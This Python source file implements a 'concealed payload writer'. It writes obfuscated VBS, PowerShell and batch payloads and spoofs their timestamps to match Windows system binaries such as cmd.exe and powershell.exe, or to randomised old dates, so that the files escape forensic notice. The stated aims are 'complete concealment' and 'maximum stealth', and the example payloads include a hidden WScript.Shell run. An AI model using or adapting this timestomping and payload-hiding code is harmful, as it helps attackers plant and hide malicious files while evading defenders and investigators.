#!/usr/bin/env python3
"""
Payload File Writer with Timestamp Spoofing Integration
Demonstrates using timestamp spoofer with payload file writer for complete concealment
"""

import os
import tempfile
from datetime import datetime
from pathlib import Path

from payload_file_writer import PayloadFileWriter, FileFormat
from timestamp_spoofer import TimestampSpoofer, SystemFileTimestampMatcher


class ConcealedPayloadWriter:
    """Write payloads with spoofed timestamps for better concealment"""

    def __init__(self, base_temp_dir: str = None):
        """
        Initialize concealed payload writer

        Args:
            base_temp_dir: Base directory for temporary files
        """
        self.payload_writer = PayloadFileWriter(base_temp_dir)
        self.timestamp_spoofer = TimestampSpoofer()
        self.system_matcher = SystemFileTimestampMatcher()

    def write_concealed_payload(self,
                               payload: str,
                               file_format: FileFormat = FileFormat.VBS,
                               obfuscation_level: str = "high",
                               spoof_to_system: bool = True,
                               system_file_ref: str = None) -> dict:
        """
        Write payload and spoof timestamps to appear as system file

        Args:
            payload: Payload content
            file_format: Output file format
            obfuscation_level: Obfuscation level
            spoof_to_system: Spoof to system file timestamp
            system_file_ref: Specific system file to match (or auto-detect)

        Returns:
            Dictionary with payload_path, metadata, timestamp_info
        """
        # Write payload
        path, payload_metadata = self.payload_writer.write_payload(
            payload,
            file_format=file_format,
            obfuscation_level=obfuscation_level
        )

        # Spoof timestamps
        timestamp_info = None
        if spoof_to_system:
            if system_file_ref:
                timestamp_info = self.timestamp_spoofer.spoof_to_match_file(
                    path,
                    system_file_ref
                )
            else:
                # Auto-detect appropriate system file
                if file_format == FileFormat.VBS:
                    # VBS files might match script engine files
                    timestamp_info = self._spoof_to_script_engine(path)
                elif file_format == FileFormat.PS1:
                    timestamp_info = self._spoof_to_powershell(path)
                elif file_format == FileFormat.BAT:
                    timestamp_info = self._spoof_to_batch_engine(path)
                else:
                    # Default to system binary
                    try:
                        timestamp_info = self.system_matcher.match_to_system_binary(path)
                    except FileNotFoundError:
                        # Fallback to old date
                        old_date = datetime(2015, 7, 29)
                        timestamp_info = self.timestamp_spoofer.spoof_to_datetime(
                            path,
                            old_date
                        )

        return {
            "payload_path": path,
            "payload_metadata": payload_metadata,
            "timestamp_info": timestamp_info
        }

    def write_batch_concealed_payloads(self,
                                      payloads: dict,
                                      file_format: FileFormat = FileFormat.VBS,
                                      spoof_to_system: bool = True) -> dict:
        """
        Write multiple payloads with spoofed timestamps

        Args:
            payloads: Dictionary of payload_name -> payload_content
            file_format: Output format for all payloads
            spoof_to_system: Spoof timestamps

        Returns:
            Dictionary mapping payload names to results
        """
        results = {}
        for name, payload in payloads.items():
            try:
                result = self.write_concealed_payload(
                    payload,
                    file_format=file_format,
                    spoof_to_system=spoof_to_system
                )
                results[name] = result
            except Exception as e:
                print(f"Error writing payload '{name}': {e}")
                results[name] = None

        return results

    def write_payload_family(self,
                            payloads: dict,
                            file_format: FileFormat = FileFormat.VBS,
                            family_timestamp: datetime = None) -> dict:
        """
        Write multiple payloads with identical timestamps (file family)

        Args:
            payloads: Dictionary of payload_name -> payload_content
            file_format: Output format
            family_timestamp: Timestamp for entire family (or auto-detect)

        Returns:
            Dictionary mapping names to results
        """
        # Write all payloads without spoofing first
        temp_results = {}
        for name, payload in payloads.items():
            path, metadata = self.payload_writer.write_payload(
                payload,
                file_format=file_format
            )
            temp_results[name] = (path, metadata)

        # Get family timestamp
        if family_timestamp is None:
            # Use old system file timestamp
            try:
                system_file = self.timestamp_spoofer._get_system_reference_file()
                family_timestamp_epoch, _, _ = self.timestamp_spoofer.get_file_timestamps(system_file)
                family_timestamp = datetime.fromtimestamp(family_timestamp_epoch)
            except:
                family_timestamp = datetime(2015, 7, 29, 0, 0, 0)

        # Clone timestamps to all files
        paths = [path for path, _ in temp_results.values()]
        if paths:
            # Set first file, then clone to others
            first_path = paths[0]
            self.timestamp_spoofer.spoof_to_datetime(first_path, family_timestamp)

            if len(paths) > 1:
                self.timestamp_spoofer.clone_timestamps(first_path, paths[1:])

        # Build results
        results = {}
        for name, (path, metadata) in temp_results.items():
            timestamp_info = self.timestamp_spoofer.get_history().get(path)
            results[name] = {
                "payload_path": path,
                "payload_metadata": metadata,
                "timestamp_info": timestamp_info
            }

        return results

    def write_payload_with_stealth_timestamps(self,
                                             payload: str,
                                             file_format: FileFormat = FileFormat.VBS,
                                             stealth_level: str = "high") -> dict:
        """
        Write payload with advanced timestamp spoofing for maximum stealth

        Args:
            payload: Payload content
            file_format: Output format
            stealth_level: Stealth level (low, medium, high)

        Returns:
            Result dictionary
        """
        # Write payload
        path, payload_metadata = self.payload_writer.write_payload(
            payload,
            file_format=file_format,
            obfuscation_level="high"
        )

        timestamp_info = None

        if stealth_level in ["medium", "high"]:
            # Match to system binary
            try:
                timestamp_info = self.system_matcher.match_to_system_binary(path)
            except FileNotFoundError:
                pass

        if stealth_level == "high":
            # If system matching didn't work, use old date with randomization
            if not timestamp_info or not timestamp_info.spoof_success:
                # Use Windows 10 era dates
                from datetime import timedelta
                base_date = datetime(2015, 7, 29)

                # Add small random offset
                import random
                offset_days = random.randint(0, 30)
                offset_hours = random.randint(0, 23)

                target_date = base_date + timedelta(
                    days=offset_days,
                    hours=offset_hours
                )

                timestamp_info = self.timestamp_spoofer.spoof_to_datetime(
                    path,
                    target_date
                )

        return {
            "payload_path": path,
            "payload_metadata": payload_metadata,
            "timestamp_info": timestamp_info,
            "stealth_level": stealth_level
        }

    def export_payload_manifest(self, result_dict: dict) -> str:
        """
        Export manifest of written payloads with metadata

        Args:
            result_dict: Result from write_concealed_payload(s)

        Returns:
            JSON string with payload information
        """
        import json

        manifest = {
            "payloads": []
        }

        # Handle both single result and batch results
        items = result_dict.items() if isinstance(result_dict, dict) else [("payload", result_dict)]

        for name, result in items:
            if result and result.get("payload_path"):
                entry = {
                    "name": name,
                    "path": result["payload_path"],
                    "format": result["payload_metadata"].format if result["payload_metadata"] else "unknown",
                    "original_size": result["payload_metadata"].original_size if result["payload_metadata"] else 0,
                    "encoded_size": result["payload_metadata"].encoded_size if result["payload_metadata"] else 0,
                    "timestamp": result["timestamp_info"].mtime_dt if result["timestamp_info"] else "unknown"
                }
                manifest["payloads"].append(entry)

        return json.dumps(manifest, indent=2)

    def cleanup_payloads(self, result_dict: dict) -> int:
        """
        Clean up all written payloads

        Args:
            result_dict: Result from write operations

        Returns:
            Number of files cleaned
        """
        count = 0
        items = result_dict.items() if isinstance(result_dict, dict) else [(None, result_dict)]

        for _, result in items:
            if result and result.get("payload_metadata"):
                file_id = result["payload_metadata"].file_id
                if self.payload_writer.cleanup_temp_file(file_id):
                    count += 1

        return count

    # Private helper methods

    def _spoof_to_script_engine(self, file_path: str):
        """Spoof to VBScript engine file"""
        candidates = [
            "C:\\Windows\\System32\\cscript.exe",
            "/usr/bin/python3",
            "/bin/sh",
        ]

        for candidate in candidates:
            if os.path.exists(candidate):
                return self.timestamp_spoofer.spoof_to_match_file(file_path, candidate)

        # Fallback to old date
        return self.timestamp_spoofer.spoof_to_datetime(
            file_path,
            datetime(2015, 7, 29)
        )

    def _spoof_to_powershell(self, file_path: str):
        """Spoof to PowerShell file"""
        candidates = [
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "/usr/bin/python3",
            "/bin/sh",
        ]

        for candidate in candidates:
            if os.path.exists(candidate):
                return self.timestamp_spoofer.spoof_to_match_file(file_path, candidate)

        return self.timestamp_spoofer.spoof_to_datetime(
            file_path,
            datetime(2016, 1, 1)
        )

    def _spoof_to_batch_engine(self, file_path: str):
        """Spoof to batch file engine"""
        candidates = [
            "C:\\Windows\\System32\\cmd.exe",
            "/bin/bash",
            "/bin/sh",
        ]

        for candidate in candidates:
            if os.path.exists(candidate):
                return self.timestamp_spoofer.spoof_to_match_file(file_path, candidate)

        return self.timestamp_spoofer.spoof_to_datetime(
            file_path,
            datetime(2000, 1, 1)
        )


# Example usage

if __name__ == "__main__":
    print("=" * 60)
    print("Concealed Payload Writer with Timestamp Spoofing")
    print("=" * 60 + "\n")

    writer = ConcealedPayloadWriter()

    # Example 1: Single concealed payload
    print("Example 1: Write concealed VBS payload")
    print("-" * 60)

    vbs_payload = '''Set shell = CreateObject("WScript.Shell")
shell.Run "cmd /c echo hidden", 0, False'''

    result = writer.write_concealed_payload(
        vbs_payload,
        file_format=FileFormat.VBS,
        spoof_to_system=True
    )

    if result["payload_path"]:
        print(f"Payload path: {result['payload_path']}")
        print(f"Size: {result['payload_metadata'].encoded_size} bytes")
        if result["timestamp_info"]:
            print(f"Spoofed timestamp: {result['timestamp_info'].mtime_dt}")
        print()

    # Example 2: Batch payloads
    print("Example 2: Write batch of concealed payloads")
    print("-" * 60)

    batch_payloads = {
        "stage1": "echo Stage 1",
        "stage2": "echo Stage 2",
        "stage3": "echo Stage 3"
    }

    batch_results = writer.write_batch_concealed_payloads(
        batch_payloads,
        file_format=FileFormat.BAT
    )

    for name, result in batch_results.items():
        if result and result["payload_path"]:
            print(f"{name}: {result['payload_path']}")
            if result["timestamp_info"]:
                print(f"  Timestamp: {result['timestamp_info'].mtime_dt}")

    print()

    # Example 3: Payload family with identical timestamps
    print("Example 3: Write payload family with identical timestamps")
    print("-" * 60)

    family_payloads = {
        "dll1": "REM DLL 1",
        "dll2": "REM DLL 2",
        "dll3": "REM DLL 3"
    }

    family_results = writer.write_payload_family(
        family_payloads,
        file_format=FileFormat.BAT
    )

    for name, result in family_results.items():
        if result and result["payload_path"]:
            print(f"{name}: {result['payload_path']}")
            if result["timestamp_info"]:
                print(f"  Timestamp: {result['timestamp_info'].mtime_dt}")

    print()

    # Example 4: Manifest
    print("Example 4: Export payload manifest")
    print("-" * 60)

    if batch_results:
        manifest = writer.export_payload_manifest(batch_results)
        print(manifest)

    # Cleanup
    print("\nCleaning up...")
    if batch_results:
        cleaned = writer.cleanup_payloads(batch_results)
        print(f"Cleaned up {cleaned} payloads")
